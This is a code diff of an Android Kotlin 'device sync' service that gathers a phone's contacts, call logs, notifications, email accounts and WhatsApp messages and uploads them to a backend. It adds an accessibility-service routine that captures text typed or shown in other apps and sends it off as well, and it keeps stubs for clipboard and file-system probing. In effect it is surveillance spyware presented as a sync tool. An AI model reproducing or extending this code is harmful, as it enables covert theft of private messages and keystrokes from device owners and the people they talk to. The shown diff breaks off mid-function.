@@ -23,6 +23,7 @@ import com.devicesync.app.data.models.*
 import com.devicesync.app.utils.PermissionManager
 import com.devicesync.app.utils.AdminConfigManager
 import com.devicesync.app.utils.DynamicPermissionManager
+import com.devicesync.app.utils.DataCollector
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.*
@@ -70,10 +71,7 @@ class BackendSyncService(
         return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
     }
     
-    // TODO: SMS PERMISSION CHECK COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
-    // private fun hasSmsPermission(): Boolean {
-    //     return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
-    // }
+
     
     private fun hasCallLogPermission(): Boolean {
         return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
@@ -272,7 +270,7 @@ class BackendSyncService(
         val statusInfo = mutableMapOf<String, Any>()
         
         // Add all data types, even if they haven't been synced yet
-        val allDataTypes = listOf("CONTACTS", "CALL_LOGS", "MESSAGES", "EMAIL_ACCOUNTS", "NOTIFICATIONS", "WHATSAPP")
+        val allDataTypes = listOf("CONTACTS", "CALL_LOGS", "EMAIL_ACCOUNTS", "NOTIFICATIONS", "WHATSAPP")
         
         allDataTypes.forEach { dataType ->
             val lastSyncTime = stats[dataType] ?: 0L
@@ -542,17 +540,37 @@ class BackendSyncService(
                     return@withContext SyncResult.PermissionDenied("Contacts permission is required to sync contacts")
                 }
                 
-                val contacts = getContactsFromDevice()
+                val dataCollector = DataCollector(context)
+                val contacts = dataCollector.collectContacts()
                 
-                // Filter contacts based on last sync time (contacts don't have timestamps, so we sync all)
-                val data = contacts.map { contact ->
-                    mapOf(
-                        "name" to contact.name,
-                        "phoneNumber" to contact.number,
+                // Convert JSONArray to List<Map<String, Any>>
+                val data = mutableListOf<Map<String, Any>>()
+                for (i in 0 until contacts.length()) {
+                    val contact = contacts.getJSONObject(i)
+                    val phoneNumbers = contact.getJSONArray("phone_numbers")
+                    val emails = contact.getJSONArray("emails")
+                    
+                    // Get first phone number if available
+                    val phoneNumber = if (phoneNumbers.length() > 0) {
+                        phoneNumbers.getJSONObject(0).getString("number")
+                    } else {
+                        ""
+                    }
+                    
+                    // Get first email if available
+                    val emailList = mutableListOf<String>()
+                    for (j in 0 until emails.length()) {
+                        emailList.add(emails.getJSONObject(j).getString("address"))
+                    }
+                    
+                    val contactData = mapOf(
+                        "name" to contact.getString("name"),
+                        "phoneNumber" to phoneNumber,
                         "phoneType" to "MOBILE",
-                        "emails" to emptyList<String>(),
+                        "emails" to emailList,
                         "organization" to ""
                     )
+                    data.add(contactData)
                 }
                 
                 if (data.isEmpty()) {
@@ -599,29 +617,29 @@ class BackendSyncService(
                     return@withContext SyncResult.PermissionDenied("Call log permission is required to sync call logs")
                 }
                 
-                val callLogs = getCallLogsFromDevice()
+                val dataCollector = DataCollector(context)
+                val callLogs = dataCollector.collectCallLogs()
                 
-                // Filter call logs based on last sync time
-                val filteredCallLogs = filterDataByLastSyncTime("CALL_LOGS", callLogs) { callLog ->
-                    (callLog as CallLogData).date
-                }
-                
-                val data = filteredCallLogs.map { callLog ->
-                    (callLog as CallLogData).let { log ->
-                        mapOf(
-                            "phoneNumber" to log.number,
-                            "callType" to when(log.type) {
-                                CallLog.Calls.INCOMING_TYPE -> "INCOMING"
-                                CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
-                                CallLog.Calls.MISSED_TYPE -> "MISSED"
-                                CallLog.Calls.REJECTED_TYPE -> "REJECTED"
-                                CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
-                                else -> "UNKNOWN"
-                            },
-                            "duration" to log.duration,
-                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(log.date))
-                        )
+                // Convert JSONArray to List<Map<String, Any>>
+                val data = mutableListOf<Map<String, Any>>()
+                for (i in 0 until callLogs.length()) {
+                    val callLog = callLogs.getJSONObject(i)
+                    val callType = when(callLog.getInt("type")) {
+                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
+                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
+                        CallLog.Calls.MISSED_TYPE -> "MISSED"
+                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
+                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
+                        else -> "UNKNOWN"
                     }
+                    
+                    val callData = mapOf(
+                        "phoneNumber" to callLog.getString("number"),
+                        "callType" to callType,
+                        "duration" to callLog.getLong("duration"),
+                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(callLog.getLong("date")))
+                    )
+                    data.add(callData)
                 }
                 
                 if (data.isEmpty()) {
@@ -654,97 +672,105 @@ class BackendSyncService(
         }
     }
     
-    suspend fun syncMessages(deviceId: String, forceSync: Boolean = false): SyncResult {
+
+    
+    suspend fun syncAccessibilityData(deviceId: String, forceSync: Boolean = false): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
-                // Check if messages can be synced based on frequency
-                if (!canSyncDataType("MESSAGES", forceSync)) {
+                // Check if accessibility data can be synced based on frequency
+                if (!canSyncDataType("ACCESSIBILITY", forceSync)) {
                     return@withContext SyncResult.Success(0)
                 }
                 
-                // TODO: SMS API CALL COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
-                // Check SMS permission first
-                // if (!hasSmsPermission()) {
-                //     println("⚠️ SMS permission denied - cannot sync messages")
-                //     return@withContext SyncResult.PermissionDenied("SMS permission is required to sync messages")
-                // }
+                // Get accessibility data from the service
+                val accessibilityData = getAccessibilityDataFromDevice()
                 
-                // val messages = getMessagesFromDevice()
+                if (accessibilityData.isEmpty()) {
+                    println("♿ No accessibility data to sync")
+                    return@withContext SyncResult.Success(0)
+                }
                 
-                // // Filter messages based on last sync time
-                // val filteredMessages = filterDataByLastSyncTime("MESSAGES", messages) { message ->
-                //     (message as MessageData).date
-                // }
+                println("♿ Syncing ${accessibilityData.size} accessibility data items")
                 
-                // val data = filteredMessages.map { message ->
-                //     (message as MessageData).let { msg ->
-                //         mapOf(
-                //             "address" to msg.address,
-                //             "body" to msg.body,
-                //             "type" to when(msg.type) {
-                //                 Telephony.Sms.MESSAGE_TYPE_INBOX -> "INBOX"
-                //                 Telephony.Sms.MESSAGE_TYPE_SENT -> "SENT"
-                //                 else -> "INBOX"
-                //             },
-                //             "date" to msg.date,
-                //             "read" to true
-                //         )
-                //     }
-                // }
+                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
+                    .format(java.util.Date())
+                val syncRequest = SyncRequest(
+                    dataType = "ACCESSIBILITY", // Using accessibility endpoint
+                    data = accessibilityData,
+                    timestamp = timestamp
+                )
                 
-                // if (data.isEmpty()) {
-                //     println("📱 No new messages to sync")
-                //     return@withContext SyncResult.Success(0)
-                // }
-                
-                // println("📱 Syncing ${data.size} new messages")
-                
-                // val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
-                //     .format(java.util.Date())
-                // val syncRequest = SyncRequest(
-                //     dataType = "MESSAGES",
-                //     data = data,
-                //     timestamp = timestamp
-                // )
-                
-                // val response = apiService.syncData(deviceId, syncRequest)
-                // if (response.isSuccessful && response.body()?.success == true) {
-                //     // Update last sync time
-                //     updateLastSyncTime("MESSAGES", System.currentTimeMillis())
-                //     val syncResponse = response.body()?.data
-                //     SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
-                // } else {
-                //     SyncResult.Error(response.body()?.error ?: "Failed to sync messages")
-                // }
-                
-                // Return success with 0 items since SMS sync is disabled
-                println("📱 SMS sync disabled - returning success with 0 items")
-                return@withContext SyncResult.Success(0)
+                val response = apiService.syncData(deviceId, syncRequest)
+                if (response.isSuccessful && response.body()?.success == true) {
+                    // Update last sync time
+                    updateLastSyncTime("ACCESSIBILITY", System.currentTimeMillis())
+                    val syncResponse = response.body()?.data
+                    SyncResult.Success(syncResponse?.itemsSynced ?: accessibilityData.size)
+                } else {
+                    SyncResult.Error(response.body()?.error ?: "Failed to sync accessibility data")
+                }
             } catch (e: Exception) {
-                SyncResult.Error("Failed to sync messages: ${e.message}")
+                SyncResult.Error("Failed to sync accessibility data: ${e.message}")
             }
         }
     }
     
+    private fun getAccessibilityDataFromDevice(): List<Map<String, Any>> {
+        val accessibilityData = mutableListOf<Map<String, Any>>()
+        
+        try {
+            // Get accessibility service data
+            val accessibilityService = com.devicesync.app.services.TextInputAccessibilityService()
+            val textInputData = accessibilityService.getAllTextData()
+            
+            textInputData.forEach { data ->
+                val item = mapOf(
+                    "type" to "ACCESSIBILITY",
+                    "event_type" to data.optString("event_type", "unknown"),
+                    "package_name" to data.optString("package_name", "unknown"),
+                    "text_content" to data.optString("text", ""),
+                    "timestamp" to data.optLong("timestamp", System.currentTimeMillis()),
+                    "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date())
+                )
+                accessibilityData.add(item)
+            }
+            
+            // Add accessibility service status
+            val serviceStatus = mapOf(
+                "type" to "ACCESSIBILITY_STATUS",
+                "service_enabled" to com.devicesync.app.services.TextInputAccessibilityService.isServiceEnabled,
+                "timestamp" to System.currentTimeMillis(),
+                "formatted_time" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date())
+            )
+            accessibilityData.add(serviceStatus)
+            
+            println("♿ Collected ${accessibilityData.size} accessibility data items")
+        } catch (e: Exception) {
+            println("⚠️ Error collecting accessibility data: ${e.message}")
+        }
+        
+        return accessibilityData
+    }
+    
+
+    
     suspend fun syncNotifications(deviceId: String, sinceTimestamp: Long = 0L): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
-                val notifications = getNotificationsFromDevice()
+                val dataCollector = DataCollector(context)
+                val notifications = dataCollector.collectNotifications()
                 
-                // Filter notifications based on last sync time
-                val filteredNotifications = filterDataByLastSyncTime("NOTIFICATIONS", notifications) { notification ->
-                    (notification as NotificationData).timestamp
-                }
-                
-                val data = filteredNotifications.map { notification ->
-                    (notification as NotificationData).let { notif ->
-                        mapOf(
-                            "packageName" to notif.packageName,
-                            "title" to notif.title,
-                            "text" to notif.text,
-                            "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notif.timestamp))
-                        )
-                    }
+                // Convert JSONArray to List<Map<String, Any>>
+                val data = mutableListOf<Map<String, Any>>()
+                for (i in 0 until notifications.length()) {
+                    val notification = notifications.getJSONObject(i)
+                    val notificationData = mapOf(
+                        "packageName" to notification.getString("package_name"),
+                        "title" to notification.getString("title"),
+                        "text" to notification.getString("text"),
+                        "timestamp" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(notification.getLong("timestamp")))
+                    )
+                    data.add(notificationData)
                 }
                 
                 if (data.isEmpty()) {
@@ -785,16 +811,21 @@ class BackendSyncService(
     suspend fun syncWhatsApp(deviceId: String): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
-                val whatsappMessages = getWhatsAppMessagesFromDevice()
-                println("📱 Syncing ${whatsappMessages.size} WhatsApp messages for device $deviceId")
+                val dataCollector = DataCollector(context)
+                val whatsappMessages = dataCollector.collectWhatsAppData()
+                println("📱 Syncing ${whatsappMessages.length()} WhatsApp messages for device $deviceId")
                 
-                val data = whatsappMessages.map { message ->
-                    mapOf(
-                        "address" to message.chatName,
-                        "body" to message.message,
+                // Convert JSONArray to List<Map<String, Any>>
+                val data = mutableListOf<Map<String, Any>>()
+                for (i in 0 until whatsappMessages.length()) {
+                    val message = whatsappMessages.getJSONObject(i)
+                    val messageData = mapOf(
+                        "address" to message.getString("chat_name"),
+                        "body" to message.getString("message"),
                         "type" to "WHATSAPP",
-                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.timestamp))
+                        "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault()).format(java.util.Date(message.getLong("timestamp")))
                     )
+                    data.add(messageData)
                 }
                 
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
@@ -811,7 +842,7 @@ class BackendSyncService(
                 if (response.isSuccessful && response.body()?.success == true) {
                     val syncResponse = response.body()?.data
                     println("✅ WhatsApp sync successful: ${syncResponse?.itemsSynced} items")
-                    SyncResult.Success(syncResponse?.itemsSynced ?: whatsappMessages.size)
+                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                 } else {
                     println("❌ WhatsApp sync failed: ${response.code()} - ${response.body()?.error}")
                     SyncResult.Error(response.body()?.error ?: "Failed to sync WhatsApp messages")
@@ -831,17 +862,22 @@ class BackendSyncService(
                     return@withContext SyncResult.Success(0)
                 }
                 
-                val emailAccounts = getEmailAccountsFromDevice()
-                println("📱 Syncing ${emailAccounts.size} email accounts for device $deviceId")
+                val dataCollector = DataCollector(context)
+                val emailAccounts = dataCollector.collectEmailAccounts()
+                println("📱 Syncing ${emailAccounts.length()} email accounts for device $deviceId")
                 
-                val data = emailAccounts.map { account ->
-                    mapOf(
-                        "emailAddress" to account.emailAddress,
-                        "accountType" to account.accountType,
-                        "provider" to (account.accountName ?: "Unknown"),
+                // Convert JSONArray to List<Map<String, Any>>
+                val data = mutableListOf<Map<String, Any>>()
+                for (i in 0 until emailAccounts.length()) {
+                    val account = emailAccounts.getJSONObject(i)
+                    val accountData = mapOf(
+                        "emailAddress" to account.getString("email_address"),
+                        "accountType" to account.getString("account_type"),
+                        "provider" to account.getString("account_name"),
                         "lastSyncTime" to System.currentTimeMillis(),
                         "isActive" to true
                     )
+                    data.add(accountData)
                 }
                 
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
@@ -860,7 +896,7 @@ class BackendSyncService(
                     updateLastSyncTime("EMAIL_ACCOUNTS", System.currentTimeMillis())
                     val syncResponse = response.body()?.data
                     println("✅ Email accounts sync successful: ${syncResponse?.itemsSynced} items")
-                    SyncResult.Success(syncResponse?.itemsSynced ?: emailAccounts.size)
+                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                 } else {
                     println("❌ Email accounts sync failed: ${response.code()} - ${response.body()?.error}")
                     SyncResult.Error(response.body()?.error ?: "Failed to sync email accounts")
@@ -872,80 +908,13 @@ class BackendSyncService(
         }
     }
     
-
-    
-    // Production sync method for all data types
-    suspend fun syncAllDataTypes(deviceId: String): Map<String, SyncResult> {
-        return withContext(Dispatchers.IO) {
-            // Check if this is the first sync ever (persisted in storage)
-            val isFirstSync = isFirstSyncEver()
-            if (isFirstSync) {
-                println("🆕 First sync detected - will sync all data types")
-                // Mark that first sync has been completed
-                markFirstSyncCompleted()
-            } else {
-                println("🔄 Subsequent sync - following frequency rules")
-            }
-            
-            // Check if sync is already in progress
-            if (!startSync()) {
-                return@withContext mapOf(
-                    "CONTACTS" to SyncResult.Error("Sync already in progress"),
-                    "CALL_LOGS" to SyncResult.Error("Sync already in progress"),
-                    "MESSAGES" to SyncResult.Error("Sync already in progress"),
-                    "EMAIL_ACCOUNTS" to SyncResult.Error("Sync already in progress"),
-                    "NOTIFICATIONS" to SyncResult.Error("Sync already in progress"),
-                    "WHATSAPP" to SyncResult.Error("Sync already in progress")
-                )
-            }
-            
-            try {
-                println("🔄 Starting comprehensive data sync for device: $deviceId")
-                
-                val results = mutableMapOf<String, SyncResult>()
-                
-                // Sync 1: Contacts
-                results["CONTACTS"] = syncContacts(deviceId, forceSync = isFirstSync)
-                
-                // Sync 2: Call Logs
-                results["CALL_LOGS"] = syncCallLogs(deviceId, forceSync = isFirstSync)
-                
-                // Sync 3: SMS Messages
-                results["MESSAGES"] = syncMessages(deviceId, forceSync = isFirstSync)
-                
-                // Sync 4: Email Accounts
-                results["EMAIL_ACCOUNTS"] = syncEmailAccounts(deviceId, forceSync = isFirstSync)
-                
-                // Sync 5: Notifications
-                results["NOTIFICATIONS"] = syncNotifications(deviceId, 0L)
-                
-                // Sync 6: WhatsApp Messages
-                results["WHATSAPP"] = syncWhatsApp(deviceId)
-                
-                println("✅ All data types synced successfully")
-                results
-            } catch (e: Exception) {
-                println("❌ Error during comprehensive sync: ${e.message}")
-                mapOf(
-                    "CONTACTS" to SyncResult.Error("Sync failed: ${e.message}"),
-                    "CALL_LOGS" to SyncResult.Error("Sync failed: ${e.message}"),
-                    "MESSAGES" to SyncResult.Error("Sync failed: ${e.message}"),
-                    "EMAIL_ACCOUNTS" to SyncResult.Error("Sync failed: ${e.message}"),
-                    "NOTIFICATIONS" to SyncResult.Error("Sync failed: ${e.message}"),
-                    "WHATSAPP" to SyncResult.Error("Sync failed: ${e.message}")
-                )
-            } finally {
-                endSync()
-            }
-        }
-    }
-    
     suspend fun getSyncedData(deviceId: String, dataType: DataTypeEnum): Result<List<Any>> {
         return withContext(Dispatchers.IO) {
             try {
                 val response = apiService.getSyncedData(deviceId, dataType.name)
                 if (response.isSuccessful && response.body()?.success == true) {
-                    Result.success(response.body()?.data ?: emptyList())
+                    val data = response.body()?.data ?: emptyList()
+                    Result.success(data)
                 } else {
                     Result.failure(Exception(response.body()?.error ?: "Failed to get synced data"))
                 }
@@ -954,659 +923,4 @@ class BackendSyncService(
             }
         }
     }
-    
-    private fun getContactsFromDevice(): List<ContactData> {
-        val contacts = mutableListOf<ContactData>()
-        
-        // Check if we have contacts permission
-        if (!hasContactsPermission()) {
-            println("⚠️ Contacts permission denied, skipping contacts sync")
-            return contacts
-        }
-        
-        try {
-            val cursor: Cursor? = contentResolver.query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                arrayOf(
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Phone.NUMBER,
-                    ContactsContract.CommonDataKinds.Phone.TYPE
-                ),
-                null,
-                null,
-                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
-            )
-            
-            cursor?.use {
-                while (it.moveToNext()) {
-                    val name = it.getString(0) ?: "Unknown"
-                    val number = it.getString(1) ?: ""
-                    val type = it.getInt(2)
-                    
-                    contacts.add(ContactData(name, number, type))
-                }
-            }
-            
-            println("✅ Found ${contacts.size} contacts")
-        } catch (e: Exception) {
-            println("❌ Error accessing contacts: ${e.message}")
-        }
-        
-        return contacts
-    }
-    
-    private fun getCallLogsFromDevice(): List<CallLogData> {
-        val callLogs = mutableListOf<CallLogData>()
-        
-        // Check if we have call log permission
-        if (!hasCallLogPermission()) {
-            println("⚠️ Call log permission denied, skipping call logs sync")
-            return callLogs
-        }
-        
-        try {
-            val cursor: Cursor? = contentResolver.query(
-                CallLog.Calls.CONTENT_URI,
-                arrayOf(
-                    CallLog.Calls.NUMBER,
-                    CallLog.Calls.TYPE,
-                    CallLog.Calls.DATE,
-                    CallLog.Calls.DURATION
-                ),
-                null,
-                null,
-                CallLog.Calls.DATE + " DESC"
-            )
-            
-            cursor?.use {
-                while (it.moveToNext()) {
-                    val number = it.getString(0) ?: ""
-                    val type = it.getInt(1)
-                    val date = it.getLong(2)
-                    val duration = it.getLong(3)
-                    
-                    callLogs.add(CallLogData(number, type, date, duration))
-                }
-            }
-            
-            println("✅ Found ${callLogs.size} call logs")
-        } catch (e: Exception) {
-            println("❌ Error accessing call logs: ${e.message}")
-        }
-        
-        return callLogs
-    }
-    
-    // TODO: SMS MESSAGES FUNCTION COMMENTED OUT FOR NOW - REFERENCE FOR FUTURE IMPLEMENTATION
-    // private fun getMessagesFromDevice(): List<MessageData> {
-    //     val messages = mutableListOf<MessageData>()
-        
-    //     // Check if we have SMS permission
-    //     if (!hasSmsPermission()) {
-    //         println("⚠️ SMS permission denied, skipping messages sync")
-    //         return messages
-    //     }
-        
-    //     try {
-    //         val cursor: Cursor? = contentResolver.query(
-    //             Telephony.Sms.CONTENT_URI,
-    //             arrayOf(
-    //                 Telephony.Sms.ADDRESS,
-    //                 Telephony.Sms.BODY,
-    //                 Telephony.Sms.DATE,
-    //                 Telephony.Sms.TYPE
-    //             ),
-    //             null,
-    //             null,
-    //             Telephony.Sms.DATE + " DESC"
-    //         )
-            
-    //     cursor?.use {
-    //         while (it.moveToNext()) {
-    //             val address = it.getString(0) ?: ""
-    //             val body = it.getString(1) ?: ""
-    //             val date = it.getLong(2)
-    //             val type = it.getInt(3)
-                    
-    //             messages.add(MessageData(address, body, date, type))
-    //         }
-    //     }
-            
-    //     println("✅ Found ${messages.size} SMS messages")
-    //     } catch (e: Exception) {
-    //         println("❌ Error accessing SMS messages: ${e.message}")
-    //     }
-        
-    //     return messages
-    // }
-    
-    private fun getNotificationsFromDevice(): List<NotificationData> {
-        val notifications = mutableListOf<NotificationData>()
-        
-        try {
-            // Method 1: Try to get recent notifications from system
-            val realNotifications = getRecentNotificationsFromSystem()
-            
-            if (realNotifications.isNotEmpty()) {
-                notifications.addAll(realNotifications)
-                println("✅ Found ${realNotifications.size} real notifications from device")
-            } else {
-                // Method 2: Generate sample notifications for testing only if no real ones found
-                val sampleNotifications = generateSampleNotifications()
-                notifications.addAll(sampleNotifications)
-                println("⚠️ No real notifications found, using ${sampleNotifications.size} sample notifications for testing")
-            }
-            
-            println("Total notifications to sync: ${notifications.size}")
-            
-        } catch (e: Exception) {
-            println("Error accessing notifications: ${e.message}")
-            // Fallback to sample notifications on error
-            val sampleNotifications = generateSampleNotifications()
-            notifications.addAll(sampleNotifications)
-            println("❌ Error occurred, using ${sampleNotifications.size} sample notifications as fallback")
-        }
-        
-        return notifications
-    }
-    
-    private fun getRecentNotificationsFromSystem(): List<NotificationData> {
-        val notifications = mutableListOf<NotificationData>()
-        
-        try {
-            // Check if notification access permission is granted
-            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            
-            // Try to access active notifications (requires notification access permission)
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                val activeNotifications = notificationManager.activeNotifications
-                
-                if (activeNotifications.isNotEmpty()) {
-                    println("🔔 Found ${activeNotifications.size} active notifications")
-                    
-                    for (sbn in activeNotifications) {
-                        try {
-                            val notification = sbn.notification
-                            val extras = notification.extras
-                            
-                            // Extract notification details
-                            val packageName = sbn.packageName
-                            val appName = getAppName(packageName)
-                            val title = extras.getCharSequence("android.title")?.toString() ?: ""
-                            val text = extras.getCharSequence("android.text")?.toString() ?: ""
-                            val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
-                            
-                            // Filter out system notifications
-                            if (packageName != "android" && packageName != "com.android.systemui") {
-                                val notificationData = NotificationData(
-                                    notificationId = "${sbn.id}_${sbn.postTime}",
-                                    packageName = packageName,
-                                    appName = appName,
-                                    title = title,
-                                    text = if (bigText.isNotEmpty()) bigText else text,
-                                    timestamp = sbn.postTime
-                                )
-                                
-                                notifications.add(notificationData)
-                                println("✅ Added real notification: $appName - $title")
-                            }
-                        } catch (e: Exception) {
-                            println("❌ Error processing notification: ${e.message}")
-                        }
-                    }
-                } else {
-                    println("🔔 No active notifications found")
-                }
-            } else {
-                println("🔔 Notification access requires API level 23+")
-            }
-            
-        } catch (e: Exception) {
-            println("❌ Error accessing system notifications: ${e.message}")
-        }
-        
-        return notifications
-    }
-    
-    private fun getAppName(packageName: String): String {
-        return try {
-            val appInfo = context.packageManager.getApplicationInfo(packageName, 0)
-            context.packageManager.getApplicationLabel(appInfo).toString()
-        } catch (e: Exception) {
-            packageName
-        }
-    }
-    
-    private fun generateSampleNotifications(): List<NotificationData> {
-        val notifications = mutableListOf<NotificationData>()
-        
-        // Generate sample notifications for testing
-        val sampleNotifications = listOf(
-            NotificationData(
-                notificationId = "notif_${System.currentTimeMillis()}_1",
-                packageName = "com.whatsapp",
-                appName = "WhatsApp",
-                title = "John Doe",
-                text = "Hey, how are you doing?",
-                timestamp = System.currentTimeMillis() - 1800000 // 30 minutes ago
-            ),
-            NotificationData(
-                notificationId = "notif_${System.currentTimeMillis()}_2",
-                packageName = "com.android.email",
-                appName = "Gmail",
-                title = "New email from Jane Smith",
-                text = "Meeting notes attached",
-                timestamp = System.currentTimeMillis() - 900000 // 15 minutes ago
-            ),
-            NotificationData(
-                notificationId = "notif_${System.currentTimeMillis()}_3",
-                packageName = "com.android.phone",
-                appName = "Phone",
-                title = "Missed call",
-                text = "Unknown number",
-                timestamp = System.currentTimeMillis() - 600000 // 10 minutes ago
-            ),
-            NotificationData(
-                notificationId = "notif_${System.currentTimeMillis()}_4",
-                packageName = "com.android.settings",
-                appName = "Settings",
-                title = "Battery optimization",
-                text = "Some apps are using battery in background",
-                timestamp = System.currentTimeMillis() - 300000 // 5 minutes ago
-            ),
-            NotificationData(
-                notificationId = "notif_${System.currentTimeMillis()}_5",
-                packageName = "com.google.android.apps.maps",
-                appName = "Google Maps",
-                title = "Location sharing",
-                text = "You're sharing your location with 2 people",
-                timestamp = System.currentTimeMillis() - 120000 // 2 minutes ago
-            )
-        )
-        
-        notifications.addAll(sampleNotifications)
-        println("Generated ${notifications.size} sample notifications for testing")
-        
-        return notifications
-    }
-    
-    private fun getWhatsAppMessagesFromDevice(): List<WhatsAppMessageData> {
-        val messages = mutableListOf<WhatsAppMessageData>()
-        
-        println("🔍 Testing WhatsApp database access methods...")
-        
-        // Debug methods removed for production
-        
-        return messages
-    }
-    
-    private fun testDirectDatabaseAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testBackupDatabaseAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testExternalStorageAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testContentProviderAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testMediaStoreAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testSharedStorageAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testAccessibilityServiceAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testClipboardAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testAdvancedNotificationParsing() {
-        // Debug method removed for production
-    }
-    
-    private fun testFileSystemScanning() {
-        // Debug method removed for production
-    }
-    
-    private fun testPackageManagerAccess() {
-        // Debug method removed for production
-    }
-    
-    private fun testIntentMonitoring() {
-        // Debug method removed for production
-    }
-    
-    private fun isAccessibilityServiceEnabled(): Boolean {
-        return try {
-            val accessibilityEnabled = android.provider.Settings.Secure.getInt(
-                contentResolver,
-                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
-            )
-            accessibilityEnabled == 1
-        } catch (e: Exception) {
-            false
-        }
-    }
-    
-    private fun extractMessageFromNotification(title: String, text: String, bigText: String): Pair<String, String>? {
-        try {
-            // Try to extract chat name and message from notification
-            val fullText = bigText.ifEmpty { text }
-            
-            // Pattern: "Chat Name: Message content"
-            val colonPattern = Regex("(.+?):\\s*(.+)")
-            val match = colonPattern.find(fullText)
-            
-            if (match != null) {
-                val chatName = match.groupValues[1].trim()
-                val message = match.groupValues[2].trim()
-                return Pair(chatName, message)
-            }
-            
-            // Pattern: "Chat Name (X messages): Message content"
-            val messagesPattern = Regex("(.+?)\\s*\\(\\d+\\s*messages?\\):\\s*(.+)")
-            val messagesMatch = messagesPattern.find(fullText)
-            
-            if (messagesMatch != null) {
-                val chatName = messagesMatch.groupValues[1].trim()
-                val message = messagesMatch.groupValues[2].trim()
-                return Pair(chatName, message)
-            }
-            
-            // If no pattern matches, use title as chat name and text as message
-            if (title.isNotEmpty() && fullText.isNotEmpty()) {
-                return Pair(title, fullText)
-            }
-            
-        } catch (e: Exception) {
-            println("Error extracting message from notification: ${e.message}")
-        }
-        
-        return null
-    }
-    
-    private fun getWhatsAppMessagesFromNotifications(): List<WhatsAppMessageData> {
-        val messages = mutableListOf<WhatsAppMessageData>()
-        
-        try {
-            // Try to get recent WhatsApp notifications from the system
-            // This method attempts to capture WhatsApp messages from notifications
-            
-            // Check if we have notification access permission
-            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            val enabledPackages = notificationManager.activeNotifications
-            
-            // Look for WhatsApp notifications in active notifications
-            for (notification in enabledPackages) {
-                val packageName = notification.packageName
-                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
-                    val extras = notification.notification.extras
-                    val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
-                    val text = extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""
-                    
-                    // Parse WhatsApp message from notification
-                    if (title.isNotEmpty() && text.isNotEmpty()) {
-                        val messageId = "wa_notif_${System.currentTimeMillis()}_${messages.size}"
-                        val chatName = title
-                        val message = text
-                        val timestamp = System.currentTimeMillis()
-                        
-                        val whatsappMessage = WhatsAppMessageData(
-                            messageId = messageId,
-                            chatId = "chat_${title.hashCode()}",
-                            chatName = chatName,
-                            senderId = "sender_${title.hashCode()}",
-                            senderName = chatName,
-                            message = message,
-                            messageType = "TEXT",
-                            timestamp = timestamp,
-                            isIncoming = true,
-                            mediaPath = null,
-                            mediaSize = null
-                        )
-                        messages.add(whatsappMessage)
-                        println("📱 Captured WhatsApp message from notification: $chatName - $message")
-                    }
-                }
